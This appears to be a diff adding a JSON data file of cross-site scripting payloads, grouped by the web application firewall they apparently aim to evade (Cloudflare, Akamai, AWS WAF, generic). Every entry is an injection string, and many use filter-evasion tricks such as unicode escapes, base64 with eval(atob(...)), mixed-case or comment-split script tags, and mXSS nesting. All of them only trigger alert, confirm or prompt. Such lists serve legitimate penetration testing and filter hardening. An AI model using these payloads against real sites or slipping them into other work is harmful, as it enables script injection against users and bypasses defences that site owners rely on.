@@ -1,0 +1,57 @@
+{
+  "cloudflare": [
+    "<svg onload=confirm(1)>",
+    "<svg onload=prompt(1)>",
+    "<svg onload=(alert)(1)>",
+    "<svg onload=alert(1)//",
+    "<svg onload=alert`1`>",
+    "<img src=x onerror=\\u0061lert(1)>",
+    "<svg onload=\\u0061lert(1)>",
+    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+    "<details open ontoggle=confirm(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+    "\"onmouseover=alert(1) x=\"",
+    "<svg/onload=alert(1)>",
+    "<img src=x onerror=alert(document.domain)>"
+  ],
+  "akamai": [
+    "<svg onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<body onpageshow=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<details open ontoggle=alert(1)>",
+    "javascript:alert(1)",
+    "<svg><script>alert(1)</script>",
+    "<iframe srcdoc=\"<script>alert(1)</script>\">",
+    "\"autofocus/onfocus=alert(1)//",
+    "<math><mtext></table><img src=x onerror=alert(1)>"
+  ],
+  "aws_waf": [
+    "<svg onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<details/open/ontoggle=alert(1)>",
+    "<video/src/onerror=alert(1)>",
+    "<input/autofocus/onfocus=alert(1)>",
+    "\"onfocus=alert(1) autofocus x=\"",
+    "<svg><animate/onbegin=alert(1)>",
+    "javascript:/*--></title></style></textarea></noscript><img src=x onerror=alert(1)>"
+  ],
+  "generic": [
+    "<svg onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<ScRiPt>alert(1)</sCrIpT>",
+    "<IMG SRC=x ONERROR=alert(1)>",
+    "<img/src=x/onerror=alert(1)>",
+    "<img src=x onerror = alert(1)>",
+    "<svg onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "eval(atob('YWxlcnQoMSk='))",
+    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
+    "alert`1`",
+    "<svg><script>alert(1)</script>",
+    "<math><mtext></table><img src=x onerror=alert(1)>",
+    "<iframe srcdoc=\"<script>alert(1)</script>\">"
+  ]
+}
